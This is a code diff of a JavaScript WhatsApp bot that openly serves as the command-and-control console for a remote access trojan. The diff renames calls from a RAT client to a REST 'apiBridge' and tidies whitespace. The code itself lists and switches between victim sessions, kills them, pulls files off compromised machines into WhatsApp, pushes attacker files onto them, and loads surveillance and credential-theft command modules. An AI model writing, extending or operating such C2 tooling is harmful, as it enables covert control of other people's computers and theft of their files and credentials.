@@ -1,5 +1,5 @@
-import makeWASocket, { 
-  DisconnectReason, 
+import makeWASocket, {
+  DisconnectReason,
   useMultiFileAuthState,
   fetchLatestBaileysVersion,
   makeCacheableSignalKeyStore
@@ -33,7 +33,7 @@ class WhatsAppC2Bot {
     this.commandPrefix = this.config.whatsapp.prefix;
     this.ownerNumbers = this.config.whatsapp.ownerNumbers;
     this.agents = {};                       // Cache of connected agents
-    
+
     // Command modules will be initialized after socket connection
     this.surveillanceCmd = new SurveillanceCommands(null, null);
     this.credentialCmd = new CredentialCommands(null, null);
@@ -48,7 +48,7 @@ class WhatsAppC2Bot {
     try {
       const configData = fs.readFileSync('./config.json', 'utf8');
       const config = JSON.parse(configData);
-      
+
       // Override with umbrella_config.yaml values if available
       if (this.yamlConfig.config) {
         config.ratServer = {
@@ -57,16 +57,18 @@ class WhatsAppC2Bot {
           apiPort: this.yamlConfig.get('server.api_port', 5000),
           encryptionKey: this.yamlConfig.get('agent.encryption_key', config.ratServer?.encryptionKey)
         };
-        
+
         // Update bot config from YAML
-        if (this.yamlConfig.get('bot.whatsapp.bot_owners')) {
-          config.whatsapp.ownerNumbers = this.yamlConfig.get('bot.whatsapp.bot_owners', config.whatsapp.ownerNumbers);
+        const ownerNumbers = this.yamlConfig.get('bot.whatsapp.owner_numbers') ||
+          this.yamlConfig.get('bot.whatsapp.bot_owners');
+        if (ownerNumbers) {
+          config.whatsapp.ownerNumbers = ownerNumbers;
         }
       }
-      
+
       // Validate required fields
       this.validateConfig(config);
-      
+
       return config;
     } catch (error) {
       console.error(chalk.red('Failed to load config.json'));
@@ -106,13 +108,13 @@ class WhatsAppC2Bot {
     try {
       // Initialize REST API bridge to Python server
       this.apiBridge = new APIBridgeClient();
-      
+
       // Check Python server health
       const health = await this.apiBridge.health();
-      
+
       if (health.status === 'healthy') {
         ResponseFormatter.log('success', `Python RAT Server connected via REST API`);
-        
+
         // Load connected agents
         await this.syncAgents();
       } else {
@@ -151,7 +153,7 @@ class WhatsAppC2Bot {
     this.systemCmd = new SystemCommands(this.apiBridge, this.sock);
     this.funCmd = new FunCommands(this.apiBridge, this.sock);
     this.apiCmd = new APICommandHandlers(this.apiBridge, this.sock);
-    
+
     ResponseFormatter.log('success', 'Command modules initialized with REST API bridge');
   }
 
@@ -168,7 +170,7 @@ class WhatsAppC2Bot {
     ║                                                            ║
     ╚════════════════════════════════════════════════════════════╝
     `));
-    
+
     ResponseFormatter.log('info', 'Bot starting...');
   }
 
@@ -184,20 +186,20 @@ class WhatsAppC2Bot {
    */
   async handleMessage(msg) {
     if (!msg.message) return;
-    
+
     const messageType = Object.keys(msg.message)[0];
-    
+
     // Handle text messages
     if (messageType === 'conversation' || messageType === 'extendedTextMessage') {
       const text = msg.message.conversation || msg.message.extendedTextMessage?.text;
       const from = msg.key.remoteJid;
       const sender = msg.key.participant || msg.key.remoteJid;
-      
+
       // Check authorization
       if (!this.isAuthorized(sender)) {
         ResponseFormatter.log('warning', `Unauthorized access attempt from ${sender}`);
-        await this.sock.sendMessage(from, { 
-          text: '❌ *UNAUTHORIZED*\n\nYou are not authorized to use this bot.' 
+        await this.sock.sendMessage(from, {
+          text: '❌ *UNAUTHORIZED*\n\nYou are not authorized to use this bot.'
         });
         return;
       }
@@ -229,7 +231,7 @@ class WhatsAppC2Bot {
     try {
       // Send "executing" status for most commands
       if (!['help', 'ping', 'sessions', 'active'].includes(command)) {
-        await this.sock.sendMessage(chatId, { 
+        await this.sock.sendMessage(chatId, {
           text: ResponseFormatter.executing(`/${command} ${args.join(' ')}`)
         });
       }
@@ -463,13 +465,13 @@ class WhatsAppC2Bot {
           break;
 
         default:
-          await this.sock.sendMessage(chatId, { 
+          await this.sock.sendMessage(chatId, {
             text: ResponseFormatter.error(`Unknown command: */${command}*\n\nType /help for command list.`)
           });
       }
     } catch (error) {
       ResponseFormatter.log('error', `Command error: ${error.message}`);
-      await this.sock.sendMessage(chatId, { 
+      await this.sock.sendMessage(chatId, {
         text: ResponseFormatter.error(`Command failed: ${error.message}`)
       });
     }
@@ -484,8 +486,8 @@ class WhatsAppC2Bot {
     const helpRequest = HelpHandler.parseHelpCommand(fullText);
 
     if (!helpRequest) {
-      await this.sock.sendMessage(chatId, { 
-        text: ResponseFormatter.error('Invalid help syntax. Try /help') 
+      await this.sock.sendMessage(chatId, {
+        text: ResponseFormatter.error('Invalid help syntax. Try /help')
       });
       return;
     }
@@ -493,8 +495,8 @@ class WhatsAppC2Bot {
     const response = HelpHandler.processHelpRequest(helpRequest);
 
     if (!response) {
-      await this.sock.sendMessage(chatId, { 
-        text: ResponseFormatter.error('Help topic not found. Try /help') 
+      await this.sock.sendMessage(chatId, {
+        text: ResponseFormatter.error('Help topic not found. Try /help')
       });
       return;
     }
@@ -511,183 +513,183 @@ class WhatsAppC2Bot {
     const uptime = process.uptime();
     const hours = Math.floor(uptime / 3600);
     const minutes = Math.floor((uptime % 3600) / 60);
-    
+
     const response = `🏓 *PONG!*\n\n` +
-                    `✅ Bot Status: Online\n` +
-                    `⏱️ Uptime: ${hours}h ${minutes}m\n` +
-                    `🔌 RAT Server: ${this.ratClient?.connected ? 'Connected' : 'Ready'}\n` +
-                    `📱 Active Session: ${this.currentSession || 'None'}`;
-    
+      `✅ Bot Status: Online\n` +
+      `⏱️ Uptime: ${hours}h ${minutes}m\n` +
+      `🔌 RAT Server: ${this.apiBridge?.connected ? 'Connected' : 'Ready'}\n` +
+      `📱 Active Session: ${this.currentSession || 'None'}`;
+
     await this.sock.sendMessage(chatId, { text: response });
   }
 
   async cmdSessions(chatId) {
     try {
-      const sessions = await this.ratClient.getSessions();
-      await this.sock.sendMessage(chatId, { 
-        text: ResponseFormatter.sessionList(sessions) 
+      const sessions = await this.apiBridge.getSessions();
+      await this.sock.sendMessage(chatId, {
+        text: ResponseFormatter.sessionList(sessions)
       });
     } catch (error) {
-      await this.sock.sendMessage(chatId, { 
-        text: ResponseFormatter.error(`Failed to get sessions: ${error.message}`) 
+      await this.sock.sendMessage(chatId, {
+        text: ResponseFormatter.error(`Failed to get sessions: ${error.message}`)
       });
     }
   }
 
   async cmdUseSession(chatId, args) {
     if (args.length === 0) {
-      await this.sock.sendMessage(chatId, { 
-        text: ResponseFormatter.error('Usage: /use <session_id>') 
+      await this.sock.sendMessage(chatId, {
+        text: ResponseFormatter.error('Usage: /use <session_id>')
       });
       return;
     }
 
     const sessionId = parseInt(args[0]);
     this.currentSession = sessionId;
-    this.ratClient.setActiveSession(sessionId);
-    
-    await this.sock.sendMessage(chatId, { 
-      text: ResponseFormatter.success(`Switched to session *${sessionId}*`) 
+    this.apiBridge.setActiveSession(sessionId);
+
+    await this.sock.sendMessage(chatId, {
+      text: ResponseFormatter.success(`Switched to session *${sessionId}*`)
     });
   }
 
   async cmdActiveSession(chatId) {
     if (!this.currentSession) {
-      await this.sock.sendMessage(chatId, { 
-        text: ResponseFormatter.warning('No active session. Use /sessions to list available sessions.') 
+      await this.sock.sendMessage(chatId, {
+        text: ResponseFormatter.warning('No active session. Use /sessions to list available sessions.')
       });
       return;
     }
 
-    await this.sock.sendMessage(chatId, { 
-      text: ResponseFormatter.info(`Current session: *${this.currentSession}*`) 
+    await this.sock.sendMessage(chatId, {
+      text: ResponseFormatter.info(`Current session: *${this.currentSession}*`)
     });
   }
 
   async cmdKillSession(chatId, args) {
     if (args.length === 0) {
-      await this.sock.sendMessage(chatId, { 
-        text: ResponseFormatter.error('Usage: /kill <session_id>') 
+      await this.sock.sendMessage(chatId, {
+        text: ResponseFormatter.error('Usage: /kill <session_id>')
       });
       return;
     }
 
     const sessionId = parseInt(args[0]);
-    
+
     try {
-      await this.ratClient.sendCommand(sessionId, 'exit', 5000);
-      await this.sock.sendMessage(chatId, { 
-        text: ResponseFormatter.success(`Session *${sessionId}* killed`) 
+      await this.apiBridge.sendCommand(sessionId, 'exit', 5000);
+      await this.sock.sendMessage(chatId, {
+        text: ResponseFormatter.success(`Session *${sessionId}* killed`)
       });
     } catch (error) {
-      await this.sock.sendMessage(chatId, { 
-        text: ResponseFormatter.error(`Failed to kill session: ${error.message}`) 
+      await this.sock.sendMessage(chatId, {
+        text: ResponseFormatter.error(`Failed to kill session: ${error.message}`)
       });
     }
   }
 
   async cmdDownload(chatId, args) {
     if (!this.currentSession) {
-      await this.sock.sendMessage(chatId, { 
-        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
+      await this.sock.sendMessage(chatId, {
+        text: ResponseFormatter.warning('No active session. Use /use <id> first.')
       });
       return;
     }
 
     if (args.length === 0) {
-      await this.sock.sendMessage(chatId, { 
-        text: ResponseFormatter.error('Usage: /download <filepath>') 
+      await this.sock.sendMessage(chatId, {
+        text: ResponseFormatter.error('Usage: /download <filepath>')
       });
       return;
     }
 
     const filepath = args.join(' ');
-    
-    await this.sock.sendMessage(chatId, { 
-      text: ResponseFormatter.info(`📥 Downloading file...\n\n\`${filepath}\`\n\n_Please wait..._`) 
+
+    await this.sock.sendMessage(chatId, {
+      text: ResponseFormatter.info(`📥 Downloading file...\n\n\`${filepath}\`\n\n_Please wait..._`)
     });
 
     try {
-      const result = await this.ratClient.downloadFile(this.currentSession, filepath);
-      
+      const result = await this.apiBridge.downloadFile(this.currentSession, filepath);
+
       if (result.success) {
         // Check if it's base64 file data
         if (!result.data.startsWith('[')) {
           const buffer = Buffer.from(result.data, 'base64');
           const filename = filepath.split(/[/\\]/).pop();
-          
-          await this.sock.sendMessage(chatId, { 
+
+          await this.sock.sendMessage(chatId, {
             document: buffer,
             mimetype: 'application/octet-stream',
             fileName: filename,
             caption: `📥 Downloaded: ${filename}`
           });
         } else {
-          await this.sock.sendMessage(chatId, { 
-            text: ResponseFormatter.info(result.data) 
+          await this.sock.sendMessage(chatId, {
+            text: ResponseFormatter.info(result.data)
           });
         }
       } else {
-        await this.sock.sendMessage(chatId, { 
-          text: ResponseFormatter.error(result.error) 
+        await this.sock.sendMessage(chatId, {
+          text: ResponseFormatter.error(result.error)
         });
       }
     } catch (error) {
-      await this.sock.sendMessage(chatId, { 
-        text: ResponseFormatter.error(`Download failed: ${error.message}`) 
+      await this.sock.sendMessage(chatId, {
+        text: ResponseFormatter.error(`Download failed: ${error.message}`)
       });
     }
   }
 
   async cmdUpload(chatId, args, msg) {
     if (!this.currentSession) {
-      await this.sock.sendMessage(chatId, { 
-        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
+      await this.sock.sendMessage(chatId, {
+        text: ResponseFormatter.warning('No active session. Use /use <id> first.')
       });
       return;
     }
 
     // Check if message has media attachment
     const mediaMessage = msg.message?.documentMessage || msg.message?.imageMessage || msg.message?.videoMessage || msg.message?.audioMessage;
-    
+
     if (!mediaMessage) {
-      await this.sock.sendMessage(chatId, { 
-        text: ResponseFormatter.error('Please attach a file and send with /upload <target_path>\n\nExample: /upload C:\\\\Users\\\\Downloads\\\\file.txt') 
+      await this.sock.sendMessage(chatId, {
+        text: ResponseFormatter.error('Please attach a file and send with /upload <target_path>\n\nExample: /upload C:\\\\Users\\\\Downloads\\\\file.txt')
       });
       return;
     }
 
     if (args.length === 0) {
-      await this.sock.sendMessage(chatId, { 
-        text: ResponseFormatter.error('Usage: /upload <target_path>\n\nAttach the file you want to upload') 
+      await this.sock.sendMessage(chatId, {
+        text: ResponseFormatter.error('Usage: /upload <target_path>\n\nAttach the file you want to upload')
       });
       return;
     }
 
     const targetPath = args.join(' ');
-    
-    await this.sock.sendMessage(chatId, { 
-      text: ResponseFormatter.info(`📤 Uploading file to target...\n\n\`${targetPath}\`\n\n_Please wait..._`) 
+
+    await this.sock.sendMessage(chatId, {
+      text: ResponseFormatter.info(`📤 Uploading file to target...\n\n\`${targetPath}\`\n\n_Please wait..._`)
     });
 
     try {
       // Download media from WhatsApp
       const buffer = await this.sock.downloadMediaMessage(msg);
-      
-      const result = await this.ratClient.uploadFile(this.currentSession, targetPath, buffer);
-      
+
+      const result = await this.apiBridge.uploadFile(this.currentSession, targetPath, buffer);
+
       if (result.success) {
-        await this.sock.sendMessage(chatId, { 
-          text: ResponseFormatter.success(`✅ File uploaded successfully\n\n${result.data}`) 
+        await this.sock.sendMessage(chatId, {
+          text: ResponseFormatter.success(`✅ File uploaded successfully\n\n${result.data}`)
         });
       } else {
-        await this.sock.sendMessage(chatId, { 
-          text: ResponseFormatter.error(result.error) 
+        await this.sock.sendMessage(chatId, {
+          text: ResponseFormatter.error(result.error)
         });
       }
     } catch (error) {
-      await this.sock.sendMessage(chatId, { 
-        text: ResponseFormatter.error(`Upload failed: ${error.message}`) 
+      await this.sock.sendMessage(chatId, {
+        text: ResponseFormatter.error(`Upload failed: ${error.message}`)
       });
     }
   }
@@ -697,13 +699,13 @@ class WhatsAppC2Bot {
    */
   async start() {
     this.printBanner();
-    
+
     // Initialize API Bridge connection
     await this.initAPIBridge();
 
     // Setup auth
     const { state, saveCreds } = await useMultiFileAuthState('./sessions');
-    
+
     // Get latest Baileys version
     const { version } = await fetchLatestBaileysVersion();
 
@@ -728,7 +730,7 @@ class WhatsAppC2Bot {
     // Connection updates
     this.sock.ev.on('connection.update', (update) => {
       const { connection, lastDisconnect, qr } = update;
-      
+
       if (qr) {
         console.log('\n');
         qrcode.generate(qr, { small: true });
@@ -737,9 +739,9 @@ class WhatsAppC2Bot {
 
       if (connection === 'close') {
         const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
-        
+
         ResponseFormatter.log('error', 'Connection closed');
-        
+
         if (shouldReconnect) {
           ResponseFormatter.log('info', 'Reconnecting...');
           setTimeout(() => this.start(), 3000);
